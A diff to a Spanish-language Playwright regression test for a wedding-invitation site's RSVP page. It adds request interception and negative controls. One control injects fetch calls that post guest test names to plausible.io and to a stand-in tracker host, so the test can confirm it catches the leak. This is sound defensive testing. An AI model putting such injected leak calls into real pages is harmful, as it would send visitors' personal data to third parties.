@@ -1,20 +1,56 @@
 // Growi 360 · regresión funcional de Invitaciones y de desborde horizontal, basada en ESTADO observable (sin esperas fijas).
 // Se ejecuta con Playwright (clics y teclas reales) desde la herramienta existente `browser_run_code` del MCP de Playwright, o con cualquier runner
-// que invoque esta función con una `page`. Ver README.md. No agrega dependencias: es una sola función `async (page) => …`.
-// URL parametrizada: la toma de la página actual. Antes de ejecutar, navegar a «<sitio>/invitaciones/index.html»
-// (local: http://localhost:8840/invitaciones/index.html · publicado: https://growi.ar/invitaciones/).
+// que invoque esta función con una `page`. Ver README.md. No agrega dependencias: es una sola función `async (paginaInicial) => …`.
+// URL parametrizada: la toma de la página actual. Antes de ejecutar, navegar a «<sitio>/invitaciones/index.html» (local: http://localhost:8840/invitaciones/index.html · publicado: https://growi.ar/invitaciones/).
 // Cada espera es waitForFunction con tope de 5 s sobre: data-paso, capa activa (.on), ausencia de ix-in/ix-out, inert/hidden, opacidad y mensaje final.
-async (page) => {
-  const m0 = /^(https?:\/\/[^/?#]+(?:\/[^?#]*?)?)\/invitaciones(?:\/index\.html|\/)?(?:[?#].*)?$/.exec(page.url());
-  if (!m0) throw new Error('Navegar primero a <sitio>/invitaciones/index.html (la URL actual es «' + page.url() + '»).');
+async (paginaInicial) => {
+  const m0 = /^(https?:\/\/[^/?#]+(?:\/[^?#]*?)?)\/invitaciones(?:\/index\.html|\/)?(?:[?#].*)?$/.exec(paginaInicial.url());
+  if (!m0) throw new Error('Navegar primero a <sitio>/invitaciones/index.html (la URL actual es «' + paginaInicial.url() + '»).');
+  // Controles negativos: la misma prueba, con un defecto inyectado, debe FALLAR donde corresponde. Se eligen con el fragmento de la URL inicial:
+  //   …/invitaciones/index.html#control=fuga      → la página «filtra» datos de prueba hacia plausible.io y hacia un tercero (los pedidos se abortan antes de salir)
+  //   …/invitaciones/index.html#control=desborde  → se sirve inv-base.css sin la regla de menos de 360 px (defecto original de F6.1)
+  const CONTROL = (/#control=(fuga|desborde)\b/.exec(paginaInicial.url()) || [])[1] || null;
+  const page = await paginaInicial.context().newPage();   // pestaña propia: no hereda ni deja rutas, init scripts ni listeners
+  try {
   const RAIZ = m0[1], ORIGEN = /^https?:\/\/[^/]+/.exec(RAIZ)[0];
-  const BASE = RAIZ + '/invitaciones/' + (/index\.html/.test(page.url()) ? 'index.html' : '');
+  const BASE = RAIZ + '/invitaciones/' + (/index\.html/.test(paginaInicial.url()) ? 'index.html' : '');
   const res = []; const T = (n, ok, d) => res.push([n, !!ok, d === undefined ? '' : String(d)]);
   const tiempos = {}; const reqs = [], errs = [];
-  page.on('request', r => reqs.push(r.method() + ' ' + r.url() + ' ' + (r.postData() || '')));
+
+  // ---- red. El sitio publicado carga analítica Plausible (plausible.io, solo en el release). No se afirma que no haya solicitudes a terceros:
+  // se comprueba que las respuestas del RSVP no salen de la página (ni por URL ni por cuerpo), que no hay envío a WhatsApp y que el único tercero admitido es Plausible.
+  const DATOS = ['Ana Gómez', 'Camila Ríos', 'Diego Sosa', 'Lucía y Tomás. Soy'];
+  const parte = r => { const [m, u, ...c] = r.split(' '); return { m, u, cuerpo: c.join(' ') }; };
+  const fuga = r => { const { u, cuerpo } = parte(r); let d = u.replace(/\+/g, ' '); try { d = decodeURIComponent(d); } catch (e) {}
+    const t = d + ' ' + cuerpo; return DATOS.some(d => t.includes(d) || t.includes(encodeURIComponent(d))); };
+  const post = r => { const { m, u } = parte(r); return m === 'POST' && !/^https:\/\/plausible\.io\/api\/event/.test(u); };
+  const wa = r => /wa\.me|api\.whatsapp|web\.whatsapp/.test(parte(r).u);
+  const tercero = r => { const { u } = parte(r); return /^https?:/.test(u) && !u.startsWith(ORIGEN) && !/^https:\/\/plausible\.io\//.test(u); };
+  const linea = q => q.method() + ' ' + q.url() + ' ' + (q.postData() || '');
+  // Un único manejador ve TODOS los pedidos. Cuenta los que inspecciona y aborta (antes de que salgan de la máquina) los que llevan datos del RSVP,
+  // los que van a un tercero distinto de Plausible, los POST ajenos y los de WhatsApp. Un pedido abortado igual queda en `reqs`, así que las comprobaciones lo detectan.
+  const net = { vistos: 0, interceptados: 0, abortados: 0, fugasTerminadas: 0 };
+  page.on('request', q => reqs.push(linea(q)));
+  page.on('requestfinished', q => { if (fuga(linea(q))) net.fugasTerminadas++; });
   page.on('console', m => { if (m.type() === 'error') errs.push(m.text()); });
   page.on('pageerror', e => errs.push('PE ' + e.message));
-  await page.route('**/*', r => r.fallback({ headers: { ...r.request().headers(), 'cache-control': 'no-cache' } }));
+  await page.route(() => true, async r => {
+    const q = r.request(), l = linea(q);
+    net.vistos++;
+    if (fuga(l) || tercero(l) || post(l) || wa(l)) { net.interceptados++; await r.abort('blockedbyclient'); net.abortados++; return; }
+    if (CONTROL === 'desborde' && /\/inv-base\.css(\?|$)/.test(q.url())) {
+      const resp = await r.fetch(); const css = (await resp.text()).replace(/@media \(max-width:359px\)\{[^\n]*\}\n?/, '');
+      return r.fulfill({ response: resp, body: css });
+    }
+    if (q.url().startsWith(ORIGEN)) return r.continue({ headers: { ...q.headers(), 'cache-control': 'no-cache' } });
+    return r.continue();
+  });
+  if (CONTROL === 'fuga') {
+    await page.addInitScript(() => addEventListener('load', () => setTimeout(() => {
+      fetch('https://plausible.io/api/event', { method: 'POST', body: JSON.stringify({ n: 'cta', p: { nombre: 'Camila Ríos' } }) }).catch(() => {});
+      fetch('https://tracker.example.test/x?n=' + encodeURIComponent('Ana Gómez'), { method: 'POST' }).catch(() => {});
+    }, 2500)));
+  }
   await page.setViewportSize({ width: 1440, height: 900 });
   await page.goto(BASE + '?v=' + Date.now());
 
@@ -180,18 +216,10 @@ async (page) => {
 
   // ================================================ privacidad y red
   T('sin almacenamiento ni cookies nuevas', await store() === s0, await store());
-  // El sitio publicado carga analítica Plausible (plausible.io, solo en el release). No se afirma que no haya solicitudes a terceros:
-  // se comprueba que las respuestas del RSVP no salen de la página (ni por URL ni por cuerpo), que no hay envío a WhatsApp y que el único tercero admitido es Plausible.
-  const DATOS = ['Ana Gómez', 'Camila Ríos', 'Diego Sosa', 'Lucía y Tomás. Soy'];
-  const parte = r => { const [m, u, ...c] = r.split(' '); return { m, u, cuerpo: c.join(' ') }; };
-  const fuga = r => { const { u, cuerpo } = parte(r); let d = u.replace(/\+/g, ' '); try { d = decodeURIComponent(d); } catch (e) {}
-    const t = d + ' ' + cuerpo; return DATOS.some(d => t.includes(d) || t.includes(encodeURIComponent(d))); };
-  const post = r => { const { m, u } = parte(r); return m === 'POST' && !/^https:\/\/plausible\.io\/api\/event/.test(u); };
-  const wa = r => /wa\.me|api\.whatsapp|web\.whatsapp/.test(parte(r).u);
-  const tercero = r => { const { u } = parte(r); return /^https?:/.test(u) && !u.startsWith(ORIGEN) && !/^https:\/\/plausible\.io\//.test(u); };
   T('RSVP: ninguna respuesta (nombre ni mensaje) viaja en ningún pedido', !reqs.some(fuga), reqs.filter(fuga).map(r => r.slice(0, 120)).join(' | '));
   T('RSVP: sin POST a servicios propios o de terceros y sin envío a WhatsApp', !reqs.some(post) && !reqs.some(wa), reqs.filter(r => post(r) || wa(r)).map(r => r.slice(0, 120)).join(' | '));
   T('terceros: solo analítica Plausible', !reqs.some(tercero), reqs.filter(tercero).map(r => r.slice(0, 120)).join(' | '));
+  T('interceptación activa: el manejador inspeccionó los pedidos' + (CONTROL ? ' (control ' + CONTROL + ')' : ''), net.vistos > 0 && net.interceptados === net.abortados, 'inspeccionados ' + net.vistos + ' · interceptados ' + net.interceptados + ' · abortados ' + net.abortados);
   T('sin errores de consola', errs.length === 0, errs.join(' | '));
   // ================================================ desborde horizontal real (regresión F6.1: Home a 320 px medía 334 px)
   // Un desborde es: scrollWidth del documento > ancho de la ventana, o un elemento visible que sobresale sin un ancestro que lo recorte.
@@ -214,5 +242,18 @@ async (page) => {
   const timeouts = Object.entries(tiempos).filter(([, v]) => v === 'TIMEOUT').map(([k]) => k);
   T('ninguna espera de estado agotó su tiempo (5 s)', timeouts.length === 0, timeouts.join(', '));
   const lista = Object.values(tiempos).filter(v => typeof v === 'number');
-  return res.filter(r => !r[1] || /^CASO/.test(r[0])).map(r => (r[1] ? 'OK   ' : 'FALLA') + ' ' + r[0] + '  → ' + r[2]).join('\n') + '\n' + res.filter(r => r[1]).length + '/' + res.length + ' · esperas por estado: ' + lista.length + ', máx ' + Math.max(...lista) + ' ms, mediana ' + lista.sort((a, b) => a - b)[lista.length >> 1] + ' ms';
+  const informe = res.filter(r => !r[1] || /^CASO/.test(r[0])).map(r => (r[1] ? 'OK   ' : 'FALLA') + ' ' + r[0] + '  → ' + r[2]).join('\n') + '\n' + res.filter(r => r[1]).length + '/' + res.length + ' · esperas por estado: ' + lista.length + ', máx ' + Math.max(...lista) + ' ms, mediana ' + lista.sort((a, b) => a - b)[lista.length >> 1] + ' ms · red: ' + net.vistos + ' pedidos inspeccionados, ' + net.abortados + ' abortados';
+  if (!CONTROL) return informe;
+  // veredicto del control negativo: deben fallar exactamente las comprobaciones del defecto inyectado (y, en «fuga», el error de consola de los pedidos abortados); el resto, incluido el flujo RSVP, debe pasar
+  const fallan = res.filter(r => !r[1]).map(r => r[0]);
+  const esperadas = CONTROL === 'fuga'
+    ? ['RSVP: ninguna respuesta (nombre ni mensaje) viaja en ningún pedido', 'RSVP: sin POST a servicios propios o de terceros y sin envío a WhatsApp', 'terceros: solo analítica Plausible']
+    : ['desborde · Home a 320 px: el documento no supera la ventana', 'desborde · Home a 320 px: el teaser usa una columna'];
+  const toleradas = CONTROL === 'fuga' ? ['sin errores de consola'] : [];
+  const faltan = esperadas.filter(n => !fallan.includes(n)), sobran = fallan.filter(n => !esperadas.includes(n) && !toleradas.includes(n));
+  const sale = net.fugasTerminadas;   // pedidos con datos de prueba que llegaron a completarse (deben ser 0)
+  const detectado = !faltan.length && !sobran.length && (CONTROL !== 'fuga' || (net.abortados >= 2 && sale === 0));
+  return (detectado ? 'CONTROL ' + CONTROL + ': DETECTADO (falla donde debe)' : 'CONTROL ' + CONTROL + ': NO DETECTADO — faltan: ' + faltan.join(' | ') + ' · inesperadas: ' + sobran.join(' | '))
+    + ' · ' + res.filter(r => r[1]).length + '/' + res.length + ' OK (flujo RSVP incluido) · interceptados ' + net.interceptados + ', abortados ' + net.abortados + ', datos de prueba que salieron: ' + sale + '\n' + informe;
+  } finally { await page.close(); }
 }
